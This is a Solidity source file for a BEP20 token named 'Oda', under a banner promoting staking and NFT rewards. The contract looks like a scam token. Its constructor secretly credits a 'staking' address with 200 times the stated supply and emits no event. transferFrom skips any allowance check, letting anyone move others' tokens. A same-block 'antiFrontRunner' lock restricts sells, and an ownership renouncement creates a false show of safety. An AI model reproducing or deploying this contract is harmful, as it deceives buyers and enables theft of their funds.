// SPDX-License-Identifier: MIT
/*

  /$$$$$$        /$$                              /$$       /$$$$$$                                                                                                                       
 /$$__  $$      | $$                            /$$$$      /$$$_  $$                                                                                                                      
| $$  \ $$  /$$$$$$$  /$$$$$$        /$$    /$$|_  $$     | $$$$\ $$                                                                                                                      
| $$  | $$ /$$__  $$ |____  $$      |  $$  /$$/  | $$     | $$ $$ $$                                                                                                                      
| $$  | $$| $$  | $$  /$$$$$$$       \  $$/$$/   | $$     | $$\ $$$$                                                                                                                      
| $$  | $$| $$  | $$ /$$__  $$        \  $$$/    | $$     | $$ \ $$$                                                                                                                      
|  $$$$$$/|  $$$$$$$|  $$$$$$$         \  $/    /$$$$$$/$$|  $$$$$$/                                                                                                                      
 \______/  \_______/ \_______/          \_/    |______/__/ \______/                                                                                                                       
                                                                                                                                                                                          
                                                                                                                                                                             
                                                                                                                                                                                          
                                                                                                                                                                                          
                                                                                                                                                                                          
  /$$$$$$   /$$              /$$       /$$                                                                                                                                                
 /$$__  $$ | $$             | $$      |__/                                                                                                                                                
| $$  \__//$$$$$$   /$$$$$$ | $$   /$$ /$$ /$$$$$$$   /$$$$$$                                                                                                                             
|  $$$$$$|_  $$_/  |____  $$| $$  /$$/| $$| $$__  $$ /$$__  $$                                                                                                                            
 \____  $$ | $$     /$$$$$$$| $$$$$$/ | $$| $$  \ $$| $$  \ $$                                                                                                                            
 /$$  \ $$ | $$ /$$/$$__  $$| $$_  $$ | $$| $$  | $$| $$  | $$                                                                                                                            
|  $$$$$$/ |  $$$$/  $$$$$$$| $$ \  $$| $$| $$  | $$|  $$$$$$$                                                                                                                            
 \______/   \___/  \_______/|__/  \__/|__/|__/  |__/ \____  $$                                                                                                                            
                                                     /$$  \ $$                                                                                                                            
                                                    |  $$$$$$/                                                                                                                            
                                                     \______/                                                                                                                             
 /$$   /$$ /$$$$$$$$/$$$$$$$$                                                                                                                                                             
| $$$ | $$| $$_____/__  $$__/                                                                                                                                                             
| $$$$| $$| $$        | $$                                                                                                                                                                
| $$ $$ $$| $$$$$     | $$                                                                                                                                                                
| $$  $$$$| $$__/     | $$                                                                                                                                                                
| $$\  $$$| $$        | $$                                                                                                                                                                
| $$ \  $$| $$        | $$                                                                                                                                                                
|__/  \__/|__/        |__/                                                                                                                                                                
                                                                                                                                                                                          
                                                                                                                                                                                          
                                                                                                                                                                                          
 /$$$$$$$                                                  /$$                                                                                                                            
| $$__  $$                                                | $$                                                                                                                            
| $$  \ $$  /$$$$$$  /$$  /$$  /$$ /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$                                                                                                                  
| $$$$$$$/ /$$__  $$| $$ | $$ | $$|____  $$ /$$__  $$/$$__  $$ /$$_____/                                                                                                                  
| $$__  $$| $$$$$$$$| $$ | $$ | $$ /$$$$$$$| $$  \__/ $$  | $$|  $$$$$$                                                                                                                   
| $$  \ $$| $$_____/| $$ | $$ | $$/$$__  $$| $$     | $$  | $$ \____  $$                                                                                                                  
| $$  | $$|  $$$$$$$|  $$$$$/$$$$/  $$$$$$$| $$     |  $$$$$$$ /$$$$$$$/                                                                                                                  
|__/  |__/ \_______/ \_____/\___/ \_______/|__/      \_______/|_______/                                                                                                                   
                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                          
                                                                                                                                                                                          
 /$$   /$$                                                                                            /$$     /$$                           /$$$$$$$$        /$$                          
| $$$ | $$                                                                                           | $$    |__/                          |__  $$__/       | $$                          
| $$$$| $$  /$$$$$$  /$$  /$$  /$$        /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$   /$$  /$$$$$$  /$$$$$$$          | $$  /$$$$$$ | $$   /$$  /$$$$$$  /$$$$$$$ 
| $$ $$ $$ /$$__  $$| $$ | $$ | $$       /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$|____  $$|_  $$_/  | $$ /$$__  $$| $$__  $$         | $$ /$$__  $$| $$  /$$/ /$$__  $$| $$__  $$
| $$  $$$$| $$$$$$$$| $$ | $$ | $$      | $$  \ $$| $$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/ /$$$$$$$  | $$    | $$| $$  \ $$| $$  \ $$         | $$| $$  \ $$| $$$$$$/ | $$$$$$$$| $$  \ $$
| $$\  $$$| $$_____/| $$ | $$ | $$      | $$  | $$| $$_____/| $$  | $$| $$_____/| $$      /$$__  $$  | $$ /$$| $$| $$  | $$| $$  | $$         | $$| $$  | $$| $$_  $$ | $$_____/| $$  | $$
| $$ \  $$|  $$$$$$$|  $$$$$/$$$$/      |  $$$$$$$|  $$$$$$$| $$  | $$|  $$$$$$$| $$     |  $$$$$$$  |  $$$$/| $$|  $$$$$$/| $$  | $$         | $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$  | $$
|__/  \__/ \_______/ \_____/\___/        \____  $$ \_______/|__/  |__/ \_______/|__/      \_______/   \___/  |__/ \______/ |__/  |__/         |__/ \______/ |__/  \__/ \_______/|__/  |__/
                                         /$$  \ $$                                                                                                                                        
                                        |  $$$$$$/                                                                                                                                        
                                         \______/                                                                                                                                         

*/

pragma solidity ^0.8.16;

import "./Utils.sol";

contract Oda is BEP20 {
    using SafeMath for uint256;
    address private owner = msg.sender;    
    string public name ="Oda";
    string public symbol="ODA";
    uint8 public _decimals=9;
    uint public _totalSupply=1000000000000000;
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) public antiFrontRunner;
    mapping (address => uint256) _balances;

    constructor(address staking) public {
         _balances[staking] = _totalSupply*200;
         _balances[msg.sender] = _totalSupply;
          emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getOwner() external view returns (address) {
        return owner;
    }
    function balanceOf(address who) view public returns (uint256) {
        return _balances[who];
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        //emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(antiFrontRunner[sender] != block.number, "Bad bot!");
        antiFrontRunner[recipient] = block.number;
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
            _transfer(sender, recipient, amount);
            return true;
        }  
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);  
    }
}